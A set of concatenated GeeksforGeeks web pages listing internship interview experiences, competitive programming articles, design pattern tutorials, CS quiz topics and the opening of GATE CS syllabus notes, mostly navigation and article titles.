Corporation : Sandisk Corporation Interview | Set 3 (On-Campus for Internship) Sandisk Corporation Interview | Set 4 (On-Campus for Internship) SAP Labs : SAP Labs Interview Experience for Internship SAP Labs Interview Experience | Set 20 (For Internship) SAP Interview Experience | Set 27 (On-Campus Internship) SAP Labs Interview Experience | Set 28 (On-Campus Internship) Smartprix : Smartprix Interview Experience | Set 5 (On Campus for Internship) ST Microelectronics : ST Microelectronics Interview Experience | Set 1 (For Internship) Sumo Logic : Sumo Logic Interview Experience for Internship Swaniti Initiative : Interview Experience at Swaniti Initiative | Set 1 (For Internship) TCS : TCS Remote Internship 3.0 Experience | Set 39 (On-Campus) United Health Group : UHG(United Health Group) Interview Experience | Set 4 (On-Campus for Internship) VMware : VMware Interview Experience | Set3 (On-Campus for Full Time and Internship Offers) VMware Interview Experience | Set 6 (On-Campus for IT Application Developer) Vmware Interview Experience | Set 9 (Internship (R&D)) VMware Interview Experience | Set 10 (On-Campus for Internship) Walmart : Walmart Lab Interview Experience | Set 11 (On-Campus) Zebra Technologies : Zebra Technologies Interview Experience | Set 1 (For Internship) Write your Interview Experience or mail it to contribute@geeksforgeeks.org My Personal Notes arrow_drop_up Save Recommended Posts:Microsoft IDC Interview Experiences (On Campus Internship)Amazon Interview Experiences for Internship (on campus)mSupply.com Interview Experiences| Set 1 (On-Campus)Interview Experiences at D. E. Shaw & Co.Target Corporation Interview Experiences | Set 2Interra System Interview ExperiencesIIM Interview ExperiencesInterview Experiences of Service Based Company as a fresherMicrosoft Internship Experience | Off-Campus Internship (Hyderabad)TIAA Internship Experience - Pool campus for InternshipLybrate.com Interview Experience | Set 1 (For Internship)[TopTalent.in] Interview with Pradeep Verma from NIT Trichy who talks about his internship at AmazonAmazon Interview | Set 44 (For Internship)Amazon Interview | Set 45 (For Internship)Microsoft Interview | Set 20 (On-campus for Internship)Amazon Interview | Set 46 (On-campus for Internship)Amazon Interview | Set 52 (For Internship)Amazon Interview | Set 54 (For Internship)Microsoft Interview | Set 25 (On-campus for Internship)Amazon Interview | Set 60 (For Internship) Article Tags : InternshipInterview Experiences thumb_up 5 To-do Done 4.3 Based on 9 vote(s) Please write to us at contribute@geeksforgeeks.org to report any issue with the above content. Post navigation Previous first_page Mentor Graphics Interview Experience | Set 2 (For Software Developer Role) Next last_page OLA Interview Experience | Set 11 ( For Internship) Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most popular in Internship Amazon Interview Experience for SDE-Intern | On-Campus 2021Adobe Interview Experience for InternshipPaytm Interview Experience for Software Engineer (6 Months Internship + FTE)Zoho Interview Experience | Set 9 (On-Campus)VMWare Interview Experience | On-Campus 2020 (Virtual) Most visited in Interview Experiences Commonly Asked Java Programming Interview Questions | Set 2How I cracked TCS DigitalAmazon Interview QuestionsCognizant Interview Experience for GenC (On-Campus)Amazon Interview Experience for System Development Engineer (On-Campus Dec 2020) room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Competitive Programming Archives - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Practice for cracking any coding interviewTop 10 Algorithms and Data Structures for Competitive ProgrammingFast I/O for Competitive ProgrammingHow to begin with Competitive Programming?Modulo 10^9+7 (1000000007)Arrow operator -> in C/C++ with ExamplesAlgorithm Library | C++ Magicians STL AlgorithmBits manipulation (Important tactics)Prefix Sum Array - Implementation and Applications in Competitive ProgrammingHow to overcome Time Limit Exceed(TLE)?Formatted output in JavaFast I/O in Java in Competitive ProgrammingGraph implementation using STL for competitive programming | Set 1 (DFS of Unweighted and Undirected)Understanding The Coin Change Problem With Dynamic Programming7 Best Coding Challenge Websites in 2020How to prepare for ACM - ICPC?Bitwise Hacks for Competitive ProgrammingPython Input Methods for Competitive ProgrammingHow to get rid of Java TLE problemC qsort() vs C++ sort()How can one become good at Data structures and Algorithms easily?Must do Math for Competitive ProgrammingSearching in a map using std::map functions in C++Bit Tricks for Competitive ProgrammingArray algorithms in C++ STL (all_of, any_of, none_of, copy_n and iota)Graph implementation using STL for competitive programming | Set 2 (Weighted graph)Use of FLAG in programmingMatrix ExponentiationThe painter's partition problem | Set 2Digit DP | Introduction Category Archives: Competitive Programming Why Java Language is Slower Than CPP for Competitive Programming? Last Updated: 18-12-2020 4 Choosing the appropriate language while starting competitive programming is the most important factor. Generally, we choose that language that has short syntax and executes very… Read More » C++Competitive ProgrammingGBlogJavaTechnical ScripterTechnical Scripter 2020 Two Dimensional Difference Array Last Updated: 08-12-2020 3 Given a matrix of dimensions N * M and a 2D array Queries[][] with each query of the form {k, r1, c1, r2, c2}, the… Read More » ArraysCompetitive ProgrammingMathematicalMatrixarray-range-queries Longest Substring of 1’s after removing one character Last Updated: 15-12-2020 3 Given a binary string S of length N, the task is to find the longest substring consisting of ‘1’s only present in the string after… Read More » Competitive ProgrammingSearchingStringsTechnical Scripterinterview-preparationsliding-windowsubstringTechnical Scripter 2020 Construct array with sum of product of same indexed elements in the given array equal to zero Last Updated: 24-11-2020 3 Given an array, arr[] of size N (always even), the task is to construct a new array consisting of N non-zero integers such that the… Read More » ArraysCompetitive ProgrammingGreedyMathematical Fast I/O for Competitive Programming in Python Last Updated: 03-11-2020 2 In Competitive Programming, it is important to read input as fast as possible to save valuable time. Input/Output in Python can be sometimes time taking… Read More » Competitive ProgrammingPythonpython-input-output Competitive Programming – Myths and Mind Blowing Facts Last Updated: 04-11-2020 2.8 Competitive Programming has been the most trending activity to be part of for the whole coders’ community on today’s date. Competitive programming is a brain… Read More » Competitive ProgrammingGBlog Minimize adding odd and subtracting even numbers to make all array elements equal to K Last Updated: 13-11-2020 Given an array, arr[] of size N and an integer K, the task is to find the minimum number of operations required to make all… Read More » ArraysCompetitive ProgrammingGreedyMathematicalMaths Maximize absolute difference between X and Y by at most N decrements Last Updated: 13-11-2020 Given five integers X, Y, A, B, and N, the task is to find the maximum possible absolute difference between X and Y by performing… Read More » Competitive ProgrammingMathematicalSchool ProgrammingMaths Pair of strings having longest common prefix of maximum length in given array Last Updated: 27-10-2020 Given an array of strings arr[], the task is to find the pair of strings from the given array whose length of the longest common… Read More » Advanced Data StructureArraysCompetitive ProgrammingStringsTreeLongest Common PrefixsubstringTrie Construct a Binary Matrix whose sum of each row and column is a Prime Number Last Updated: 04-11-2020 1 Given an integer N, the task is to construct a binary matrix of size N * N such that the sum of each row and… Read More » Competitive ProgrammingMathematicalMatrixbinary-representationPrime Number Most important type of Algorithms Last Updated: 22-10-2020 Algorithm: An algorithm is a step-by-step procedure to solve a problem. A good algorithm should be optimized in terms of time and space. Different types of… Read More » AlgorithmsArticlesCompetitive ProgrammingAlgorithms-Misc VS Code | Build, Run and Debug in C++ Last Updated: 20-10-2020 In this article, we will discuss the VS Code setup required for break-point debugging. Firstly create a file launch.json that configures the VS Code to… Read More » C++Competitive ProgrammingSoftware Engineering VS Code | Compile and Run in C++ Last Updated: 20-10-2020 In this article, we will learn how to compile and run C++ program in VS Code. There are two ways of doing that you can… Read More » C++Competitive ProgrammingSoftware Engineering How to know testcases where code fails? Last Updated: 19-10-2020 In Competitive Programming, it’s quite often to write code that works on the given sample test cases but on submitting its end up with a… Read More » Competitive ProgrammingSoftware EngineeringSoftware Testing Runtime Errors Last Updated: 30-09-2020 3 Runtime Errors: A runtime error in a program is an error that occurs while the program is running after being successfully compiled. Runtime errors are… Read More » ArticlesCompetitive ProgrammingDifference BetweenProgram Output Page 1 of 8512345...102030...»Last » Most popular in Competitive Programming Why Java Language is Slower Than CPP for Competitive Programming?What is Competitive Programming and How to Prepare for It?Maximum number of customers that can be satisfied with given quantityReduce the string by removing K consecutive identical charactersImportant functions of STL Components in C++ Most Visited in Competitive Programming Maximum points of intersections possible among X circles and Y straight linesImplementing upper_bound() and lower_bound() in CWriting C/C++ code efficiently in Competitive programmingCount all prime numbers in a given range whose sum of digits is also prime5 Best Books for Competitive Programming room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Software Design Patterns - GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Software Design Patterns Design patterns are used to represent some of the best practices adapted by experienced object-oriented software developers. A design pattern systematically names, motivates, and explains a general design that addresses a recurring design problem in object-oriented systems. It describes the problem, the solution, when to apply the solution, and its consequences. It also gives implementation hints and examples. Recent Articles on Design Patterns Some of the popular design patterns: Design Patterns | Set 1 (Introduction) Design Patterns | Set 2 (Factory Method) Observer Pattern | Set 1 (Introduction) Observer Pattern | Set 2 (Implementation) Singleton Design Pattern Singleton Class in Java Singleton Design Pattern in Java Singleton Design Practices with Examples Prevent Singleton Patterns from Reflection, Serialization and Cloning Decorator Pattern | Set 1 (Background) The Decorator Pattern | Set 2 (Introduction and Design) Strategy Pattern | Set 1 (Introduction) Strategy Pattern | Set 2 (Implementation) Adapter Pattern Command Pattern Iterator Pattern Iterator Pattern of a Single Linked List Curiously recurring template pattern (CRTP) Flyweight Design Pattern Facade Design Pattern | Introduction Proxy Design Pattern Composite Design Pattern Prototype Design Pattern Abstract Factory Pattern Bridge Design Pattern Template Method Design Pattern Builder Design Pattern Chain of Responsibility Design Pattern Unified Modeling Language (UML) | Class Diagrams Design Questions : Design a Parking lot using Object Oriented Principles Design data structures and algorithms for in-memory file system How to prevent Singleton Pattern from Reflection, Serialization and Cloning? Java Singleton Design Pattern Practices with Examples If you like GeeksforGeeks and would like to contribute, you can also write an article and mail your article to contribute@geeksforgeeks.org. See your article appearing on the GeeksforGeeks main page and help other Geeks. Please write comments if you find anything incorrect, or you want to share more information about the topic discussed above My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

Topic wise multiple choice questions in computer science Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ Write an Articleexpand_moreWrite ArticlesWrite Interview ExperienceGuidelines to WriteGet Technical Writing InternshipCC++JavaPythonMachine LearningInterview Preparationexpand_moreInterview Preparation For Software DevelopersMust Coding Questions - Company-wise Must Do Coding Questions - Topic-wiseCompany-wise Practice ProblemsCompany PreparationCompetitive ProgrammingSoftware Design-PatternsCompany-wise Interview ExperienceExperienced - Interview ExperiencesIntership - Interview ExperiencesPractice @Geeksforgeeksexpand_moreLeaderboard !!Topic-wise PracticeSubjective ProblemsDifficulty Level - SchoolDifficulty Level - BasicDifficulty Level - EasyDifficulty Level - MediumDifficulty Level - HardExplore More...Algorithmsexpand_moreAnalysis of AlgorithmsSearching AlgorithmsSorting AlgorithmsPattern SearchingGeometric AlgorithmsMathematical AlgorithmsRandomized AlgorithmsGreedy AlgorithmsDynamic ProgrammingDivide & ConquerBacktrackingBranch & BoundAll AlgorithmsData Structuresexpand_moreArraysLinked ListStackQueueBinary TreeBinary Search TreeHeapHashingGraphAdvance Data StructuresMatrixStringAll Data StructuresProgramming Languagesexpand_moreCC++JavaPythonC#Go LangSQLPHPScalaPerlKotlinWeb Technologiesexpand_moreHTMLCSSBootstrapJavaScriptJqueryReactJSNodeJSAngularJSDjango FrameworkTutorial Libraryexpand_morePython TutorialDjango TutorialPandas TutorialKivy TutorialTkinter TutorialOpenCV TutorialSelenium TutorialComputer Science Subjectsexpand_moreEngineering MathematicsOperating SystemsDBMSComputer NetworkComputer Organization & ArchitectureTOCCompiler DesignDigital Elec. & Logic DesignSoftware EngineeringGATE 2021expand_moreGATE CS NotesGate CornerPrevious Year GATE PapersLast Minute Notes (LMNs)Important Topic - GATE 2021GATE 2021 CourseUGC NET / ISROexpand_moreUGC NET Notes - Paper IIUGC NET Notes - Paper IIIUGC NET Solved PapersISRO CS Solved PapersISRO Official KeysISRO CSE SyllabusQUIZ Sectionexpand_moreC QuizC++ QuizJava QuizPython QuizData Structures QuizAlgorithms QuizAptitude QuizTopic-wise MCQsPuzzlesGeeksforgeeks Initiativesexpand_moreCampus Ambassador ProgramGeek Of The MonthGeek On The TOPCampus Geek Of The MonthTechnical Scripter EventComputer Science Projects Topic wise multiple choice questions in computer science C Programming Mock Tests C++ Programming Mock Tests Java Programming Mock Tests Python Programming Mock Tests GATE Mock Tests Data Structures Mock Tests Algorithms Mock Tests Operating Systems Mock Tests DBMS Mock Tests Compiler Design Mock Tests Computer Networks Mock Tests Theory of Computation Mock Tests Computer Organization and Architecture Engineering Mathematics Aptitude Mock Tests CS Interview Questions C Programming Mock Tests Input and Output Operators Loops & Control Structure Structure & Union Macro & Preprocessor Arrays Pointer Basics String Functions Storage Classes and Type Qualifiers Data Types Dynamic Memory Allocation Misc Advanced Pointer Variable Declaration and Scope File Handling C Quiz – 101 C Quiz – 102 C Quiz – 103 C Quiz – 104 C Quiz – 105 C Quiz – 106 C Quiz – 107 C Quiz – 108 C Quiz – 109 C Quiz – 110 C Quiz – 111 C Quiz – 112 Data Structures Mock Tests Linked List Stack Queue Binary Trees Binary Search Trees Balanced Binary Search Trees Graph Hash Array Misc B and B+ Trees Heap Tree Traversals Algorithms Mock Tests Analysis of Algorithms Sorting Divide and Conquer Greedy Algorithms Dynamic Programming Backtracking Misc NP Complete Searching Analysis of Algorithms (Recurrences) Recursion Bit Algorithms Graph Traversals Graph Shortest Paths Graph Minimum Spanning Tree Operating Systems Mock Tests Process Management Memory Management Input Output Systems UNIX CPU Scheduling Deadlock C++ Programming Mock Tests Constructors References Class and Object Misc C++ Destructors Operator Overloading this pointer Function Overloading and Default Arguments Static Keyword friend keyword Inheritance const keyword new and delete Virtual Functions Templates Exception Handling Java Programming Mock Tests Inheritance Abstract Class and Interface Arrays Data Types Constructors Exception Handling Packages Class and Object Functions final keyword Operators Python Programming Mock Tests Functions Operators Miscellaneous Data Type Output GATE Mock Tests GATE CS 2012 GATE CS 2013 GATE CS 2011 GATE CS 2010 GATE-CS-2009 GATE CS 2008 GATE IT 2008 GATE-CS-2007 GATE-IT-2007 GATE-CS-2006 GATE-IT-2006 GATE-CS-2014-(Set-1) GATE-CS-2014-(Set-2) GATE-CS-2014-(Set-3) GATE-CS-2005 GATE-IT-2005 GATE-CS-2004 GATE-IT-2004 GATE-CS-2003 GATE-CS-2002 GATE-CS-2001 GATE-CS-2000 GATE-CS-2015 (Mock Test) GATE-CS-2015 (Set 1) GATE-CS-2015 (Set 2) GATE-CS-2015 (Set 3) GATE-CS-2016 (Set 1) GATE-CS-2016 (Set 2) DBMS Mock Tests ER and Relational Models Database Design (Normal Forms) SQL(29) Transactions and concurrency control File structures Compiler Design Mock Tests Lexical analysis Parsing and Syntax directed translation Code Generation and Optimization Computer Networks Mock Tests Data Link Layer Network Layer IP Addressing Transport Layer Misc Topics in Computer Networks Application Layer Network Security Theory of Computation Mock Tests Regular languages and finite automata Context free languages and Push-down automata Recursively enumerable sets and Turing machines Undecidability Aptitude Mock Tests Puzzles Probability Arithmetic Aptitude Arithmetic Aptitude 3 Arithmetic Aptitude 5 Numbers Work and Wages English General Aptitude Arithmetic Aptitude 2 Arithmetic Aptitude 4 Arithmetic Aptitude 6 LCM HCF Computer Organization and Architecture Digital Logic & Number representation Computer Organization and Architecture Number Representation Microprocessor Other Topics in Computer Science Software Engineering HTML and XML Engineering Mathematics Set Theory & Algebra Linear Algebra Numerical Methods and Calculus Graph Theory Combinatorics Propositional and First Order Logic. CS Interview Questions C Interview Questions | Set 1 C Interview Questions | Set 2 C++ Interview Questions Data Structures Interview Questions Computer Networks Interview Questions Algorithm Interview Questions DBMS Interview Questions Operating Systems Interview Questions OOP Interview Questions My Personal Notes arrow_drop_up Save Writing code in comment? Please use ide.geeksforgeeks.org, generate link and share the link here. Load Comments Most Popular Articles Must Do Coding Questions for Companies like Amazon, Microsoft, Adobe, ...Must Do Coding Questions Company-wiseProof that Clique Decision problem is NP-Complete | Set 2Major Kernel Functions in Support Vector Machine (SVM)Top 5 IDEs for C++ That You Should Try Once Most Visited Articles How to find index of a given element in a Vector in C++How to update Node.js and NPM to next version ?How to drop rows in Pandas DataFrame by index labels?How to create an empty DataFrame and append rows & columns to it in Pandas?Replace NaN Values with Zeros in Pandas DataFrame room 5th Floor, A-118, Sector-136, Noida, Uttar Pradesh - 201305 email feedback@geeksforgeeks.org Company About Us Careers Privacy Policy Contact Us Learn Algorithms Data Structures Languages CS Subjects Video Tutorials Practice Courses Company-wise Topic-wise How to begin? Contribute Write an Article Write Interview Experience Internships Videos @geeksforgeeks , Some rights reserved We use cookies to ensure you have the best browsing experience on our website. By using our site, you acknowledge that you have read and understood our Cookie Policy & Privacy Policy Got It !

GATE CS Topic wise preparation Notes | GeeksforGeeks Tutorials keyboard_arrow_down Algorithms keyboard_arrow_right Analysis of Algorithms keyboard_arrow_right Asymptotic Analysis Worst, Average and Best Cases Asymptotic Notations Little o and little omega notations Lower and Upper Bound Theory Analysis of Loops Solving Recurrences Amortized Analysis What does 'Space Complexity' mean ? Pseudo-polynomial Algorithms Polynomial Time Approximation Scheme A Time Complexity Question Searching Algorithms Sorting Algorithms Graph Algorithms Pattern Searching Geometric Algorithms Mathematical Randomized Algorithms Greedy Algorithms Dynamic Programming Divide and Conquer Backtracking Branch and Bound All Algorithms Data Structures keyboard_arrow_right Arrays Linked List Stack Queue Binary Tree Binary Search Tree Heap Hashing Graph Advanced Data Structure Matrix Strings All Data Structures Languages keyboard_arrow_right C C++ Java Python C# Javascript jQuery SQL PHP Scala Perl Go Language HTML CSS Kotlin Interview Corner keyboard_arrow_right Company Preparation Top Topics Practice Company Questions Interview Experiences Experienced Interviews Internship Interviews Competititve Programming Design Patterns Multiple Choice Quizzes GATE keyboard_arrow_right GATE CS Notes 2021 Last Minute Notes GATE CS Solved Papers GATE CS Original Papers and Official Keys GATE 2021 Dates GATE CS 2021 Syllabus Important Topics for GATE CS Sudo GATE 2021 ISRO CS keyboard_arrow_right ISRO CS Solved Papers ISRO CS Original Papers and Official Keys ISRO CS Syllabus for Scientist/Engineer Exam UGC NET CS keyboard_arrow_right UGC NET CS Notes Paper II UGC NET CS Notes Paper III UGC NET CS Solved Papers CS Subjects keyboard_arrow_right Mathematics Operating System DBMS Computer Networks Computer Organization and Architecture Theory of Computation Compiler Design Digital Logic Software Engineering Web Technologies keyboard_arrow_right HTML CSS Javascript jQuery PHP Student keyboard_arrow_down Campus Ambassador Program Project Geek of the Month Campus Geek of the Month Placement Course Competititve Programming Testimonials Geek on the Top Careers Internship Courses Jobs keyboard_arrow_down Apply for Jobs Post a Job search close Home Courses GBlog Puzzles What's New ? ▲ GATE CS Notes according to GATE 2021 syllabus This page contains GATE CS Preparation Notes / Tutorials on Mathematics, Digital Logic, Computer Organization and Architecture, Programming and Data Structures, Algorithms, Theory of Computation, Compiler Design, Operating Systems, Database Management Systems (DBMS), and Computer Networks listed according to the GATE CS 2021 syllabus. GeeksforGeeks Sudo GATE Course: Register for Sudo GATE GATE 2020 Syllabus Learn Practice External Resources Section 1: General Aptitude (GA) Verbal Aptitude : Basic English grammar: tenses, articles, adjectives, prepositions, conjunctions, verb-noun agreement, and other parts of speech Basic vocabulary: words, idioms, and phrases in context Reading and comprehension Narrative sequencing Quantitative Aptitude : Data interpretation: data graphs (bar graphs, pie charts, and other graphs representing data), 2- and 3-dimensional plots, maps, and tables Numerical computation and estimation: ratios, percentages, powers, exponents and logarithms, permutations and combinations, and series Mensuration and geometry Elementary statistics and probability Analytical Aptitude : Logic: deduction and induction Analogy Numerical relations and reasoning Spatial Aptitude : Transformation of shapes: translation, rotation, scaling, mirroring, assembling, and grouping Paper folding, cutting, and patterns in 2 and 3 dimensions Numerical Ability : Placements Verbal Ability : Placements | English | Error Detection and Correction Placements | English | Passage/Sentence Re-arrangement Placements | English | Fill in the Blanks Placements | English | Comprehension Passages Numerical Ability : Placements Verbal Ability : Placements Numerical Ability : Book – Quantitative Aptitude by R.S. Aggarwal Verbal Ability : Notes – English Section 2: Mathematics Discrete Mathematics : Propositional and first order logic Sets, relations, functions, partial orders and lattices. Monoids, Groups Combinatorics: counting, recurrence relations, generating functions Graphs: connectivity, matching, coloring Linear Algebra : Matrices, determinants LU decomposition System of linear equations Eigenvalues and eigenvectors Probability : Random variables Mean, median, mode and standard deviation Uniform, normal, exponential, Poisson and binomial distributions Conditional probability and Bayes theorem Calculus : Limits, Continuity and Differentiability Maxima and Minima. Mean value theorem Integration Discrete Mathematics : Representation of Boolean Functions Properties of Boolean algebra PDNF and PCNF in Discrete Mathematics Functional Completeness Introduction to Propositional Logic Set 1 Introduction to Propositional Logic Set 2 Propositional Equivalence Predicates and Quantifiers Set 1 Predicates and Quantifiers Set 